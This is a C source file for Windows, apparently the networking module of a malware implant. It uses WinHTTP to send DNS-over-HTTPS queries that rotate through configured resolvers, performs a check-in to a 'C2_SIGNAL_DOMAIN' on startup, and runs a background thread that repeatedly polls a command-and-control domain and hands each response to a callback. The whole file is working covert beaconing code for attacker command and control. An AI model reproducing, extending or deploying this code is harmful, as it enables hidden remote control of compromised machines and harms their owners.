#define _CRT_SECURE_NO_WARNINGS
#include "net.h"
#include "config.h"  
#include <winhttp.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

#pragma comment(lib, "Winhttp.lib")

static const char *g_dohAnsiHosts[DOH_COUNT] = {
    DOH_SERVER_0,
#if DOH_SERVER_COUNT > 1
    DOH_SERVER_1,
#endif
#if DOH_SERVER_COUNT > 2
    DOH_SERVER_2,
#endif
};

static int       g_serverIndex = 0;
static HINTERNET g_hSession    = NULL;

BOOL Net_Init(void)
{
    g_hSession = WinHttpOpen(
        L"DoH-Client/1.0",
        WINHTTP_ACCESS_TYPE_NO_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0
    );
    if (!g_hSession)
        return FALSE;

    {
        uint8_t dummy[256];
        size_t  len = sizeof(dummy);
        if (!Net_DoHQuery(C2_SIGNAL_DOMAIN, 1 /*A*/, dummy, &len)) {
            WinHttpCloseHandle(g_hSession);
            g_hSession = NULL;
            return FALSE;
        }
    }

    return TRUE;
}

BOOL Net_DoHQuery(const char *domain,
                  uint16_t     qtype,
                  uint8_t     *buffer,
                  size_t      *buf_len)
{
    if (!g_hSession || !domain || !buffer || !buf_len) return FALSE;

    const char *ansiHost = g_dohAnsiHosts[g_serverIndex];
    g_serverIndex = (g_serverIndex + 1) % DOH_COUNT;

    wchar_t wHost[256];
    if (!MultiByteToWideChar(CP_UTF8, 0, ansiHost, -1, wHost, _countof(wHost)))
        return FALSE;

    char urlAnsi[256];
    if (_snprintf(urlAnsi, sizeof(urlAnsi),
                  "/dns-query?name=%s&type=%u",
                  domain, qtype) < 0)
        return FALSE;

    wchar_t wUrl[256];
    if (!MultiByteToWideChar(CP_UTF8, 0, urlAnsi, -1, wUrl, _countof(wUrl)))
        return FALSE;

    HINTERNET hConnect = WinHttpConnect(
        g_hSession, wHost,
        (INTERNET_PORT)DOH_HTTPS_PORT,
        0
    );
    if (!hConnect) return FALSE;

    HINTERNET hReq = WinHttpOpenRequest(
        hConnect, L"GET", wUrl,
        NULL, WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        WINHTTP_FLAG_SECURE
    );
    if (!hReq) {
        WinHttpCloseHandle(hConnect);
        return FALSE;
    }

    WinHttpAddRequestHeaders(
        hReq,
        L"Accept: application/dns-message\r\n",
        -1, WINHTTP_ADDREQ_FLAG_REPLACE
    );

    BOOL ok = WinHttpSendRequest(hReq, NULL, 0, NULL, 0, 0, 0);
    if (ok) ok = WinHttpReceiveResponse(hReq, NULL);

    if (ok) {
        DWORD totalRead = 0;
        size_t cap = *buf_len;
        for (;;) {
            DWORD avail = 0;
            if (!WinHttpQueryDataAvailable(hReq, &avail) || avail == 0)
                break;
            if (totalRead + avail > cap) { ok = FALSE; break; }

            DWORD got = 0;
            if (!WinHttpReadData(hReq,
                                 buffer + totalRead,
                                 avail,
                                 &got)) {
                ok = FALSE;
                break;
            }
            totalRead += got;
        }
        *buf_len = totalRead;
    }

    WinHttpCloseHandle(hReq);
    WinHttpCloseHandle(hConnect);
    return ok;
}

void Net_Shutdown(void)
{
    // C2 loop
    Net_StopC2Loop();

    if (g_hSession) {
        WinHttpCloseHandle(g_hSession);
        g_hSession = NULL;
    }
}

static volatile BOOL   g_c2Running   = FALSE;
static HANDLE          g_hC2Thread   = NULL;
static char            g_c2Domain[256];
static uint16_t        g_c2Qtype      = 0;
static DWORD           g_c2IntervalMs = 0;
static Net_C2Callback  g_c2Callback   = NULL;

static DWORD WINAPI C2Thread(LPVOID lp)
{
    uint8_t buf[2048];
    size_t  len;

    while (g_c2Running) {
        len = sizeof(buf);
        if (Net_DoHQuery(g_c2Domain, g_c2Qtype, buf, &len) && len > 0) {
            if (len < sizeof(buf)) buf[len] = '\0';
            g_c2Callback(buf, len);
        }
        Sleep(g_c2IntervalMs);
    }
    return 0;
}

BOOL Net_StartC2Loop(const char    *domain,
                     uint16_t       qtype,
                     DWORD          interval_ms,
                     Net_C2Callback callback)
{
    if (!g_hSession || !domain || !callback || interval_ms == 0)
        return FALSE;

    strncpy_s(g_c2Domain, sizeof(g_c2Domain), domain, _TRUNCATE);
    g_c2Qtype      = qtype;
    g_c2IntervalMs = interval_ms;
    g_c2Callback   = callback;

    g_c2Running = TRUE;
    g_hC2Thread = CreateThread(NULL, 0, C2Thread, NULL, 0, NULL);
    if (!g_hC2Thread) {
        g_c2Running = FALSE;
        return FALSE;
    }
    return TRUE;
}

void Net_StopC2Loop(void)
{
    if (!g_c2Running) return;
    g_c2Running = FALSE;
    WaitForSingleObject(g_hC2Thread, INFINITE);
    CloseHandle(g_hC2Thread);
    g_hC2Thread = NULL;
}